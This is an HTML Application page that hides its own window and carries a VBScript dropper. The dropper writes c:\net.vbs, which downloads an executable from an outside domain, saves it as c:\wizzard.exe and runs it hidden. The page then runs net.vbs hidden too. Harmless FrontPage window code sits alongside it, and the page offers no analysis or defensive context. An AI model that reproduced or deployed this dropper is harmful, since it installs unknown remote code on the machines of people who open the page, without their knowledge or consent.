<html><head>
<hta:application id=hta_note_id
 applicationName=hta_note_name
 showInTaskBar=no
 caption=no
 innerBorder=no
 selection=no
 scroll=no
 contextmenu=no />
<script language=javascript>
window.resizeTo(0, 0);
window.moveTo(0, 0);
</script>



<SCRIPT LANGUAGE="VBScript">
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.CreateTextFile("c:\net.vbs", True)
TSO.write "Dim BinaryData" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://www.simdisohbet.com/simdisohbet.exe"", False " & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "BinaryData = xml.ResponseBody" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BinaryData" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""c:\wizzard.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "Dim WshShell"  & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""c:\wizzard.exe"", 0, false" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\net.vbs", 0, false
 </SCRIPT>


<script language="JavaScript">
<!--
function FP_openNewWindow(w,h,nav,loc,sts,menu,scroll,resize,name,url) {//v1.0
 var windowProperties=''; if(nav==false) windowProperties+='toolbar=no,'; else
  windowProperties+='toolbar=yes,'; if(loc==false) windowProperties+='location=no,'; 
 else windowProperties+='location=yes,'; if(sts==false) windowProperties+='status=no,';
 else windowProperties+='status=yes,'; if(menu==false) windowProperties+='menubar=no,';
 else windowProperties+='menubar=yes,'; if(scroll==false) windowProperties+='scrollbars=no,';
 else windowProperties+='scrollbars=yes,'; if(resize==false) windowProperties+='resizable=no,';
 else windowProperties+='resizable=yes,'; if(w!="") windowProperties+='width='+w+',';
 if(h!="") windowProperties+='height='+h; if(windowProperties!="") { 
  if( windowProperties.charAt(windowProperties.length-1)==',') 
   windowProperties=windowProperties.substring(0,windowProperties.length-1); } 
 window.open(url,name,windowProperties);
}
// -->
</script>
</head>
</html>